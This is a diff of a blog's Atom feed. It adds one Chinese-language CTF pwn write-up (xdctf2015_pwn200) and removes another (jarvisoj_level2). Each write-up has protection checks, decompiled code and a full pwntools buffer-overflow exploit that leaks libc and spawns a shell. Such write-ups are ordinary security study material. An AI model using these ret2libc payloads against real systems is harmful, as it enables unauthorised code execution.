@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-03-21T14:50:04.909Z</updated>
+  <updated>2022-03-23T15:33:23.973Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,29 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>buuctf-xdctf2015_pwn200</title>
+    <link href="http://example.com/2022/03/23/buuctf-xdctf2015-pwn200/"/>
+    <id>http://example.com/2022/03/23/buuctf-xdctf2015-pwn200/</id>
+    <published>2022-03-23T15:32:29.000Z</published>
+    <updated>2022-03-23T15:33:23.973Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="xdctf2015-pwn200"><a href="#xdctf2015-pwn200" class="headerlink" title="xdctf2015_pwn200"></a>xdctf2015_pwn200</h1><p>查看保护:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/king/study/ctf/pwn/buu/16/bof&#x27;</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found<span class="comment">//没开</span></span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="comment">//没开</span></span></span><br></pre></td></tr></table></figure><p>我们直接看往伪代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-7Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [esp+18h] [ebp-64h]</span></span><br><span class="line">  <span class="keyword">int</span> *v7; <span class="comment">// [esp+70h] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v7 = &amp;argc;</span><br><span class="line">  <span class="built_in">strcpy</span>(buf, <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>);<span class="comment">//复制到buf里面Welcome to XDCTF2015~!</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;v6, <span class="number">0</span>, <span class="number">0x4C</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, buf);<span class="comment">//</span></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(buf);<span class="comment">//然后计算出buf的长度</span></span><br><span class="line">  write(<span class="number">1</span>, buf, v3);<span class="comment">//v3是写入的字节数</span></span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我我当时盲猜应该就是溢出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>溢出+覆盖ebp的字符=112</p><p>然后这个程序中没有system函数地址,就是泄漏libc地址,利用write_plt泄漏write_libc地址</p><p>正常操作</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#p=remote(&#x27;node4.buuoj.cn&#x27;,27250)</span><br><span class="line">p=process(&#x27;./bof&#x27;)</span><br><span class="line">elf=ELF(&#x27;./bof&#x27;)</span><br><span class="line">libc=ELF(&#x27;./libc-2.23-32.so&#x27;)</span><br><span class="line">write_plt=elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got=elf.got[&#x27;write&#x27;]</span><br><span class="line">main=0x0804851C</span><br><span class="line">p.recvuntil(&#x27;XDCTF2015~!&#x27;)</span><br><span class="line">payload=&#x27;a&#x27;*112+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">write_addr=u32(p.recv(4))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">print(&quot;write&quot;,hex(write_addr))</span><br><span class="line"></span><br><span class="line">libc_addr=write_addr-libc.symbols[&#x27;write&#x27;]</span><br><span class="line">system=libc_addr+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">bin_sh=libc_addr+libc.search(&#x27;/bin/sh&#x27;).next()</span><br><span class="line"></span><br><span class="line">payload1=&#x27;a&#x27;*112+p32(system)+p32(main)+p32(bin_sh)</span><br><span class="line">p.recvuntil(&#x27;XDCTF2015~!&#x27;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:<br>又是摸鱼的一天</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;xdctf2015-pwn200&quot;&gt;&lt;a href=&quot;#xdctf2015-pwn200&quot; class=&quot;headerlink&quot; title=&quot;xdctf2015_pwn200&quot;&gt;&lt;/a&gt;xdctf2015_pwn200&lt;/h1&gt;&lt;p&gt;查看保护:&lt;/p&gt;
+&lt;fig</summary>
+      
+    
+    
+    
+    
+    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
+    
+  </entry>
   
   <entry>
     <title>buuctf-jarvisoj_test_your_memory</title>
@@ -433,29 +456,6 @@
       
       
     <summary type="html">&lt;h1 id=&quot;get-started-3dsctf-2016&quot;&gt;&lt;a href=&quot;#get-started-3dsctf-2016&quot; class=&quot;headerlink&quot; title=&quot;get_started_3dsctf_2016&quot;&gt;&lt;/a&gt;get_started_3dsct</summary>
-      
-    
-    
-    
-    
-    <category term="buuctf-pwn" scheme="http://example.com/tags/buuctf-pwn/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>buuctf-jarvisoj_level2</title>
-    <link href="http://example.com/2022/01/11/buuctf-jarvisoj-level2/"/>
-    <id>http://example.com/2022/01/11/buuctf-jarvisoj-level2/</id>
-    <published>2022-01-11T13:10:18.000Z</published>
-    <updated>2022-01-11T13:10:54.806Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><p>正常逻辑看保护</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO#没开</span><br><span class="line">Stack:    No canary found#没开</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span><span class="meta">#w没开</span></span></span><br></pre></td></tr></table></figure><p>我们先去看主代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  system(<span class="string">&quot;echo &#x27;Hello World!&#x27;&quot;</span>); <span class="comment">//得到一个函数system函数的地址</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> vulnerable_function函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  system(<span class="string">&quot;echo Input:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出漏洞</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>思路:溢出140个字符+system的函数地址+/bin/sh,/bin/sh查看ida字符串找到地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&quot;./level2&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28713</span>)</span><br><span class="line">system_plt=<span class="number">0x0804849E</span></span><br><span class="line">sh=<span class="number">0x0804A024</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>+p32(system_plt)+p32(sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>总结:</p><p>我太那个了,我忘记了看保护了,就一上去做题了,搞的我一直泄漏libc.</p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;jarvisoj-level2&quot;&gt;&lt;a href=&quot;#jarvisoj-level2&quot; class=&quot;headerlink&quot; title=&quot;jarvisoj_level2&quot;&gt;&lt;/a&gt;jarvisoj_level2&lt;/h1&gt;&lt;p&gt;正常逻辑看保护&lt;/p&gt;
-&lt;figur</summary>
       
     
     
